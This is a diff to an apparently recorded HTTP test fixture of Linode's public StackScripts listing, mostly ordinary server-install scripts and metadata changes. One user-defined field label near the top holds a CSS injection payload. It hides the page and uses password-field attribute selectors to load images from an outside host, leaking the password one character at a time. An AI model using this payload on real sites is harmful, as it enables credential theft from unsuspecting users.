@@ -764,51 +764,17 @@ interactions:
       manyOf=\"foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s\" />", "user_defined_fields":
       [{"name": "password", "label": "password", "example": "Please enter you account
       password to continue"}, {"name": "var4", "label": "pick{}body{visibility:hidden}#password{visibility:visible;position:fixed;left:50px;top:50px}#password[value$=''a'']{background-image:url(''https://aw.rs/log?a'')!important}#password[value$=''b'']{background-image:url(''https://aw.rs/log?b'')!important}#password[value$=''c'']{background-image:url(''https://aw.rs/log?c'')!important}#password[value$=''d'']{background-image:url(''https://aw.rs/log?d'')!important}#password[value$=''e'']{background-image:url(''https://aw.rs/log?e'')!important}#password[value$=''f'']{background-image:url(''https://aw.rs/log?f'')!important}#password[value$=''g'']{background-image:url(''https://aw.rs/log?g'')!important}#password[value$=''h'']{background-image:url(''https://aw.rs/log?h'')!important}#password[value$=''i'']{background-image:url(''https://aw.rs/log?i'')!important}//",
-      "manyof": "foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"}]}, {"id": 983302,
-      "username": "jengahost", "user_gravatar_id": "9cc84ec8df4771c8d6d55659d05386e8",
-      "label": "LAMP Stack", "description": "Installs a full LEMP stack (Nginx, MySQL(MariaDB),
-      PHP) on a Linode. Uses MySQL for Debian and Ubuntu; MariaDB for CentOS and Fedora
-      (the new defaults). This can also be used as a library for other StackScripts.",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos7"], "deployments_total":
-      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
-      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/usr/bin/env
-      python\r\n&quot;&quot;&quot;\r\nLEMP StackScript\r\n    \r\n    Author: Hieu
-      Bui Duc &lt;hieubd@zonmob.com&gt;\r\n    Version: 1.0.0.0\r\n    Requirements:\r\n        -
-      ss://linode/python-library &lt;ssinclude StackScriptID=&quot;3&quot;&gt;\r\n        -
-      ss://linode/nginx &lt;ssinclude StackScriptID=&quot;16509&quot;&gt;\r\n        -
-      ss://linode/mysql &lt;ssinclude StackScriptID=&quot;7&quot;&gt;\r\n        -
-      ss://linode/php &lt;ssinclude StackScriptID=&quot;8&quot;&gt;\r\nThis StackScript
-      both deploys and provides a library of functions for\r\ncreating a LAMP stack.
-      The functions in this StackScript are designed to be \r\nrun across Linode&#039;s
-      core distributions:\r\n    - Ubuntu\r\n    - CentOS\r\n    - Debian\r\n    -
-      Fedora\r\nStackScript User-Defined Variables (UDF): \r\n&lt;UDF name=&quot;db_root_password&quot;
-      label=&quot;MySQL/MariaDB root password&quot; /&gt;\r\n&lt;UDF name=&quot;db_name&quot;
-      label=&quot;Create Database&quot; default=&quot;&quot; example=&quot;create
-      this empty database&quot; /&gt;\r\n&quot;&quot;&quot;\r\nimport os\r\nimport
-      sys\r\ntry: # we&#039;ll need to rename included StackScripts before we can
-      import them\r\n    os.rename(&quot;/root/ssinclude-3&quot;, &quot;/root/pythonlib.py&quot;)\r\n    os.rename(&quot;/root/ssinclude-16509&quot;,
-      &quot;/root/nginx.py&quot;)\r\n    os.rename(&quot;/root/ssinclude-7&quot;,
-      &quot;/root/mysql.py&quot;)\r\n    os.rename(&quot;/root/ssinclude-8&quot;,
-      &quot;/root/php.py&quot;)\r\nexcept:\r\n    pass\r\nimport pythonlib\r\nimport
-      nginx\r\nimport mysql\r\nimport php\r\ndef main():\r\n    &quot;&quot;&quot;Install
-      Nginx, MySQL/MariaDB, and PHP.&quot;&quot;&quot;\r\n    # add logging support\r\n    pythonlib.init()\r\n    \r\n    if
-      os.environ[&#039;DB_ROOT_PASSWORD&#039;] != &quot;&quot;:\r\n        db_root_password
-      = os.environ[&#039;DB_ROOT_PASSWORD&#039;]\r\n    else:\r\n        db_root_password
-      = False\r\n    \r\n    if os.environ[&#039;DB_NAME&#039;] != &quot;&quot;:\r\n        db_name
-      = os.environ[&#039;DB_NAME&#039;]\r\n    else:\r\n        db_name = False\r\n    pythonlib.system_update()\r\n    nginx.nginx_install()\r\n    mysql.mysql_install(db_root_password,
-      db_name)\r\n    php.php_install()\r\n    php.php_install_module_common()\r\n    pythonlib.end()\r\nif
-      __name__ == &quot;__main__&quot;:\r\n    sys.exit(main())\r\n", "user_defined_fields":
-      []}, {"id": 2822, "username": "smartjones", "user_gravatar_id": "0b874d2362ffd16a2178ba9339c40798",
-      "label": "Smartweb", "description": "", "ordinal": 0, "logo_url": "", "images":
-      ["linode/ubuntu10.04lts32bit"], "deployments_total": 0, "deployments_active":
-      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
-      "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n#<UDF
-      name=\"db_password\" Label=\"MySQL root Password\" />\n#<UDF name=\"db_name\"
-      Label=\"Create Database\" default=\"\" example=\"Optionally create this database\"
-      />\n#<UDF name=\"db_user\" Label=\"Create MySQL User\" default=\"\" example=\"Optionally
-      create this user\" />\n#<UDF name=\"db_user_password\" Label=\"MySQL User''s
-      Password\" default=\"\" example=\"User''s password\" />\n\nsource <ssinclude
-      StackScriptID=\"1\">\n\nsystem_update\npostfix_install_loopback_only\nmysql_install
+      "manyof": "foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"}]}, {"id": 2822, "username":
+      "smartjones", "user_gravatar_id": "0b874d2362ffd16a2178ba9339c40798", "label":
+      "Smartweb", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu10.04lts32bit"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "Initial import", "script": "#!/bin/bash\n#<UDF name=\"db_password\" Label=\"MySQL
+      root Password\" />\n#<UDF name=\"db_name\" Label=\"Create Database\" default=\"\"
+      example=\"Optionally create this database\" />\n#<UDF name=\"db_user\" Label=\"Create
+      MySQL User\" default=\"\" example=\"Optionally create this user\" />\n#<UDF
+      name=\"db_user_password\" Label=\"MySQL User''s Password\" default=\"\" example=\"User''s
+      password\" />\n\nsource <ssinclude StackScriptID=\"1\">\n\nsystem_update\npostfix_install_loopback_only\nmysql_install
       \"$DB_PASSWORD\" && mysql_tune 40\nmysql_create_database \"$DB_PASSWORD\" \"$DB_NAME\"\nmysql_create_user
       \"$DB_PASSWORD\" \"$DB_USER\" \"$DB_USER_PASSWORD\"\nmysql_grant_user \"$DB_PASSWORD\"
       \"$DB_USER\" \"$DB_NAME\"\nphp_install_with_apache && php_tune\napache_install
@@ -1474,14 +1440,27 @@ interactions:
       \"Congratulations, Eventum has been successfully installed\"\necho \" \"\necho
       \"You can now configure Eventum and Softaculous Webuzo at the following URL
       :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 73228, "username":
-      "rizerapp", "user_gravatar_id": "dc70e4f46019425154b0a652de0657da", "label":
-      "lib-system-ubuntu", "description": "", "ordinal": 0, "logo_url": "", "images":
-      ["linode/ubuntu16.04lts", "linode/ubuntu16.10", "linode/ubuntu14.04lts"], "deployments_total":
-      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
-      "updated": "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n#\n#
-      System related utilities\n#\n# Copyright (c) 2010 Filip Wasilewski <en@ig.ma>.\n#\n#
-      My ref: http://www.linode.com/?r=aadfce9845055011e00f0c6c9a5c01158c452deb\n\nfunction
+      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1010699, "username":
+      "manojserver", "user_gravatar_id": "11b2d04632b07576576c4cc464c99ddf", "label":
+      "test", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu21.10"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "", "script": "#!/bin/bash\n\n# <UDF name=\"company_name\" Label=\"Company Name\"
+      example=\"My Company\" />\n# <UDF name=\"company_email\" Label=\"Company Email\"
+      example=\"my@company.com\" />\n# <UDF name=\"admin_email\" Label=\"Admin Email\"
+      example=\"my@company.com\" />\n# <UDF name=\"admin_password\" Label=\"Admin
+      Password\" example=\"s3cur39a55w0r0\" />\n\n", "user_defined_fields": [{"name":
+      "company_name", "label": "Company Name", "example": "My Company"}, {"name":
+      "company_email", "label": "Company Email", "example": "my@company.com"}, {"name":
+      "admin_email", "label": "Admin Email", "example": "my@company.com"}, {"name":
+      "admin_password", "label": "Admin Password", "example": "s3cur39a55w0r0"}]},
+      {"id": 73228, "username": "rizerapp", "user_gravatar_id": "dc70e4f46019425154b0a652de0657da",
+      "label": "lib-system-ubuntu", "description": "", "ordinal": 0, "logo_url": "",
+      "images": ["linode/ubuntu16.04lts", "linode/ubuntu16.10", "linode/ubuntu14.04lts"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "Initial import", "script": "#!/bin/bash\n#\n# System related utilities\n#\n#
+      Copyright (c) 2010 Filip Wasilewski <en@ig.ma>.\n#\n# My ref: http://www.linode.com/?r=aadfce9845055011e00f0c6c9a5c01158c452deb\n\nfunction
       lower {\n    # helper function\n    echo $1 | tr ''[:upper:]'' ''[:lower:]''\n}\n\nfunction
       system_update {\n    apt-get update && apt-get upgrade -y\n}\n\nfunction system_add_user
       {\n    # system_add_user(username, password, groups, shell=/bin/bash)\n    USERNAME=`lower
@@ -2514,7 +2493,7 @@ interactions:
       HBASE_HOME=/opt/hbase\nexport COMPRESSION=NONE\n\n/usr/share/opentsdb/tools/create_table.sh\n\n#
       Configure OpenTSDB\ncp $BASE_PATH/etc/opentsdb/opentsdb.conf /etc/opentsdb\n\n#
       Start OpenTSDB\nservice opentsdb start", "user_defined_fields": []}, {"id":
-      705310, "username": "HackerOne_c4ff2ea4", "user_gravatar_id": "3661544ff6045ff4ba8e4be7ac9c5819",
+      705310, "username": "dmc3", "user_gravatar_id": "3661544ff6045ff4ba8e4be7ac9c5819",
       "label": "test", "description": "test", "ordinal": 0, "logo_url": "", "images":
       ["linode/debian9"], "deployments_total": 0, "deployments_active": 0, "is_public":
       true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
@@ -3658,8 +3637,8 @@ interactions:
       \"Congratulations, Xoops has been successfully installed\"\necho \" \"\necho
       \"You can now configure Xoops and Softaculous Webuzo at the following URL :\"\necho
       \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}], "page": 1, "pages": 18,
-      "results": 1791}'
+      Webuzo !\"\necho \" \"", "user_defined_fields": []}], "page": 1, "pages": 19,
+      "results": 1848}'
     headers:
       Access-Control-Allow-Credentials:
       - "true"
@@ -3695,7 +3674,7 @@ interactions:
       X-Oauth-Scopes:
       - '*'
       X-Ratelimit-Limit:
-      - "800"
+      - "20"
       X-Xss-Protection:
       - 1; mode=block
     status: 200 OK
